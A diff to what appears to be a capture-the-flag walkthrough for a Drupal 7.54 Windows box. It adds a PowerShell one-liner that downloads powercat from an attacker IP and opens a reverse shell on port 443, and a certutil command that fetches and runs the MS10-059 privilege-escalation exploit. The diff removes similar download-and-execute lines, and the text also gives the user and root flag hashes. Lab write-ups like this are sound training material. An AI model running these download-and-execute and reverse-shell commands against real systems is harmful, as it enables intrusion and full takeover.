@@ -33,14 +33,24 @@ and finally fire off the exploit:
 ruby 44449.rb
 ```
 
-```sh
-certutil.exe -urlcache -split -f "http://192.168.72.128/shell.exe" "C:\inetpub\drupal-7.54\shell.exe"
-```
-
-URI encoded:
+now running this with reverse shell on `443`:
 
 ```sh
-powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.72.128/mini-reverse.ps1')
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.27/powercat.ps1');powercat -c 10.10.14.27 -p 443 -e cmd"
 ```
 
-powershell iex(new-object net.webclient).downloadstring('http://192.168.72.128/mini-reverse.ps1')
+gives us a low priv reverse shell.
+
+User.txt: `ba22fde1932d06eb76a163d312f921a2`
+
+## Privilege escalation
+
+Get systeminfo and use `windows-exploit-suggester`
+
+```sh
+certutil.exe -urlcache -split -f "http://10.10.14.27/MS10-059.exe" C:\inetpub\drupal-7.54\MS10-059.exe
+
+MS10-059.exe 10.10.14.27 5555
+```
+
+root.txt: `4bf12b963da1b30cc93496f617f7ba7c`
